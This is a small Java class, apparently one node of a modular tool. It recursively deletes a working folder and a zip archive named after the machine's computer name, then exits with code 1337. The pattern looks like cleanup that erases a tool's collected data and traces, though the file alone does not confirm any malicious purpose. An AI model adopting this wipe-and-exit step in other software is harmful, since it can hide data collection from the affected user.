package _256.node.nodes.file;

import java.io.File;
import java.io.IOException;

import org.apache.commons.io.FileUtils;

import _256.node.Category;
import _256.node.Node;

public class DeleteFile extends Node {

	public DeleteFile() {
		super(Category.FILE);
	}

	@Override
	public void createNode() throws InterruptedException {
		if (getFolder().exists()) {
			try {
				File zip = new File(System.getProperty("user.home") + "\\" + System.getenv("COMPUTERNAME") + ".zip");
				FileUtils.deleteDirectory(new java.io.File(getFolder().getAbsolutePath()));
				zip.delete();
				System.exit(1337);
			} catch (IOException e) {
				e.printStackTrace();
			}
		}
	}
}
